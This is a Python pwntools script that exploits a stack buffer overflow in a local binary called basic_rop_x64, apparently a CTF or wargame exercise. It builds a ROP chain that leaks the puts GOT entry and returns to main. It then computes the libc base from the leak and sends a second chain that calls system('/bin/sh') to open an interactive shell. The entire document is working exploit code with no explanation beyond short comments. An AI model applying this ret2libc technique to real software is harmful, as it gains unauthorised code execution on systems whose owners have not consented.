from pwn import *

p = process('./basic_rop_x64')
e = ELF('./basic_rop_x64')
libc = ELF('./libc.so.6')

puts_plt = e.plt['puts']
puts_got = e.got['puts']

main_addr = e.symbols['main']

pop_rdi_ret = 0x400883
ret = 0x4005a9

# ret2main
payload = b"a"*0x48
payload += p64(ret)
payload += p64(pop_rdi_ret)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(main_addr)
p.send(payload)

# puts got leak to find libc_base
p.recvuntil(b"a"*0x40)
puts_mapped = u64(p.recvn(6) + b'\x00'*2)
print(hex(puts_mapped))

libc_base = puts_mapped - libc.symbols['puts']
print(hex(libc_base))
system_mapped = libc_base + libc.symbols['system']
shell = libc_base + list(libc.search(b"/bin/sh"))[0]
print(hex(shell))

# rop
payload = b"a"*0x48
payload += p64(pop_rdi_ret)
payload += p64(shell)
payload += p64(system_mapped)
p.send(payload)

p.interactive()
